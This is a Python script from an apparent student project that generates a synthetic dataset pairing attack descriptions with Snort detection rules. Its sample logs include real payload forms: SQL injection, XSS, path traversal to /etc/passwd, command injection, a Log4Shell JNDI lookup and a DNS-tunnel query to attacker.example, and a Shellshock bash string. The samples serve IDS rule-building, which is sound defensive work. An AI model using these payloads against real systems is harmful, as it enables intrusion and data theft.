"""Generate the student-owned Snort dataset.

The generated dataset is not a copied public ruleset. It is a structured,
annotated, synthetic corpus derived from manually curated attack scenarios and
legitimate Snort syntax/rule-source references.
"""
from __future__ import annotations

import argparse
import json
import random
from pathlib import Path
from typing import Dict, Iterable, List

import pandas as pd

from snort_rag.source_manifest import TRUSTED_SOURCES
from snort_rag.templates import (
    ATTACK_KEYWORDS,
    CLASSTYPE,
    DESCRIPTION_TEMPLATES,
    SEVERITY,
    detect_attack_type,
    generate_snort_rule,
    stable_sid,
)
from snort_rag.rule_parser import validate_rule, option_coverage

PROJECT_ROOT = Path(__file__).resolve().parents[2]

STYLE_PREFIXES = [
    "Formal analyst request: ",
    "SOC alert description: ",
    "Short operator query: ",
    "Student scenario: ",
    "FR: ",
    "Technical note: ",
]

TARGETS = [
    "public web server", "internal DNS resolver", "Linux SSH bastion", "Windows RDP server",
    "DMZ application", "FTP server", "SMB file server", "corporate proxy", "API endpoint",
]

LOG_EXAMPLES = {
    "port_scan": "SRC=203.0.113.10 DST=10.0.0.20 PROTO=TCP FLAGS=S PORTS=21,22,80,443,445 COUNT=34 WINDOW=60s",
    "ssh_bruteforce": "SRC=198.51.100.23 DST=10.0.0.22 DPT=22 PROTO=TCP ATTEMPTS=12 WINDOW=60s",
    "ftp_bruteforce": "SRC=198.51.100.44 DST=10.0.0.21 DPT=21 PAYLOAD='USER admin' REPEATED=8",
    "rdp_bruteforce": "SRC=203.0.113.45 DST=10.0.0.39 DPT=3389 PROTO=TCP SYN_COUNT=18",
    "sql_injection": "GET /product.php?id=1%20UNION%20SELECT%20user,password%20FROM%20users HTTP/1.1",
    "xss": "GET /search?q=<script>alert(1)</script> HTTP/1.1",
    "directory_traversal": "GET /download?file=../../../../etc/passwd HTTP/1.1",
    "command_injection": "GET /ping?host=127.0.0.1;whoami HTTP/1.1",
    "log4shell": "User-Agent: ${jndi:ldap://attacker.example/a}",
    "shellshock": "User-Agent: () { :;}; /bin/bash -c id",
    "dns_tunneling": "DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example",
    "dns_axfr": "DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77",
    "icmp_sweep": "ICMP echo request from 203.0.113.90 to 10.0.0.1-10.0.0.30",
    "malware_c2": "GET /gate.php?id=abc123&v=1 HTTP/1.1 User-Agent: Mozilla/4.0",
    "smb_exploit": "TCP 445 payload starts with FF SMB and suspicious transaction bytes",
    "suspicious_user_agent": "GET / HTTP/1.1 User-Agent: sqlmap/1.7",
    "webshell_upload": "POST /upload HTTP/1.1 multipart filename=shell.php Content-Disposition: form-data",
    "benign": "GET /health HTTP/1.1 from monitoring server, expected every 30 seconds",
}

SOURCE_BY_ATTACK = {
    "port_scan": "Snort 3 Rule Writing Guide - Cisco Talos",
    "ssh_bruteforce": "Snort 3 Rule Writing Guide - Cisco Talos",
    "ftp_bruteforce": "Snort 3 Rule Writing Guide - Cisco Talos",
    "rdp_bruteforce": "Snort 3 Rule Writing Guide - Cisco Talos",
    "sql_injection": "Emerging Threats Open Rules",
    "xss": "Emerging Threats Open Rules",
    "directory_traversal": "Emerging Threats Open Rules",
    "command_injection": "Emerging Threats Open Rules",
    "log4shell": "Emerging Threats Open Rules",
    "shellshock": "Emerging Threats Open Rules",
    "dns_tunneling": "Emerging Threats Open Rules",
    "dns_axfr": "Snort 3 Rule Writing Guide - Cisco Talos",
    "icmp_sweep": "Snort 3 Rule Writing Guide - Cisco Talos",
    "malware_c2": "Emerging Threats Open Rules",
    "smb_exploit": "Snort Rules and IDS Software Downloads",
    "suspicious_user_agent": "Emerging Threats Open Rules",
    "webshell_upload": "Emerging Threats Open Rules",
    "benign": "Snort 3 Rule Writing Guide - Cisco Talos",
}

SOURCE_URL_BY_NAME = {s["name"]: s["url"] for s in TRUSTED_SOURCES}


def generate_description(attack_type: str, idx: int) -> str:
    base = random.choice(DESCRIPTION_TEMPLATES[attack_type])
    target = random.choice(TARGETS)
    style = random.choice(STYLE_PREFIXES)
    keyword_hint = ", ".join(random.sample(ATTACK_KEYWORDS[attack_type], min(2, len(ATTACK_KEYWORDS[attack_type]))))
    if attack_type == "benign":
        return f"{style}{base} Target: {target}. This should be classified as benign and should not create an alert rule."
    variants = [
        f"{style}{base} Target: {target}. Include a Snort rule with low false positives.",
        f"{style}{base} Observed log: {LOG_EXAMPLES[attack_type]}",
        f"{style}{base} Keywords: {keyword_hint}. Need a valid alert rule.",
        f"{style}{base} The rule must use msg, sid, rev and classtype.",
    ]
    return variants[idx % len(variants)]


def build_rows(multiplier: int = 8, seed: int = 42) -> List[Dict[str, object]]:
    random.seed(seed)
    rows: List[Dict[str, object]] = []
    attacks = list(DESCRIPTION_TEMPLATES.keys())
    row_id = 1
    for attack_type in attacks:
        for i in range(multiplier):
            description = generate_description(attack_type, i)
            if attack_type == "benign":
                rule = "NO_RULE_RECOMMENDED"
                valid, errors = False, ["Benign traffic: no Snort alert rule should be generated."]
            else:
                sid = stable_sid(f"dataset:{attack_type}:{i}:{description}")
                rule = generate_snort_rule(attack_type, description, sid=sid, rev=1 + (i % 3))
                valid, errors = validate_rule(rule)
            source_name = SOURCE_BY_ATTACK[attack_type]
            row = {
                "id": f"SNORT-RAG-{row_id:04d}",
                "description_nl": description,
                "normalized_description": description.lower(),
                "label": "benign" if attack_type == "benign" else "malicious",
                "attack_type": attack_type,
                "attack_family": "benign" if attack_type == "benign" else CLASSTYPE.get(attack_type, "unknown"),
                "severity": SEVERITY.get(attack_type, "medium"),
                "rule": rule,
                "rule_valid_by_parser": valid,
                "rule_validation_errors": " | ".join(errors),
                "option_coverage": option_coverage(rule) if rule != "NO_RULE_RECOMMENDED" else 0.0,
                "source_name": source_name,
                "source_url": SOURCE_URL_BY_NAME.get(source_name, ""),
                "source_usage": "student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",
                "generation_method": "manual_seed_plus_template_variation",
                "log_example": LOG_EXAMPLES[attack_type],
            }
            rows.append(row)
            row_id += 1
    return rows


def export_dataset(rows: List[Dict[str, object]], out_dir: Path) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)
    df = pd.DataFrame(rows)
    df.to_csv(out_dir / "snort_generated_dataset.csv", index=False)
    df.to_json(out_dir / "snort_generated_dataset.json", orient="records", indent=2, force_ascii=False)
    with (out_dir / "snort_generated_dataset.jsonl").open("w", encoding="utf-8") as f:
        for row in rows:
            f.write(json.dumps(row, ensure_ascii=False) + "\n")

    source_manifest = pd.DataFrame(TRUSTED_SOURCES)
    raw_dir = PROJECT_ROOT / "data" / "raw"
    raw_dir.mkdir(parents=True, exist_ok=True)
    source_manifest.to_csv(raw_dir / "trusted_sources_manifest.csv", index=False)

    summary = {
        "rows": len(rows),
        "malicious_rows": int((df["label"] == "malicious").sum()),
        "benign_rows": int((df["label"] == "benign").sum()),
        "attack_types": sorted(df["attack_type"].unique().tolist()),
        "valid_rule_rate_excluding_benign": float(df[df["label"] == "malicious"]["rule_valid_by_parser"].mean()),
    }
    (out_dir / "dataset_summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--multiplier", type=int, default=10, help="Rows per attack type.")
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument("--out", type=Path, default=PROJECT_ROOT / "data" / "processed")
    args = parser.parse_args()
    rows = build_rows(multiplier=args.multiplier, seed=args.seed)
    export_dataset(rows, args.out)
    print(f"Generated {len(rows)} rows in {args.out}")


if __name__ == "__main__":
    main()
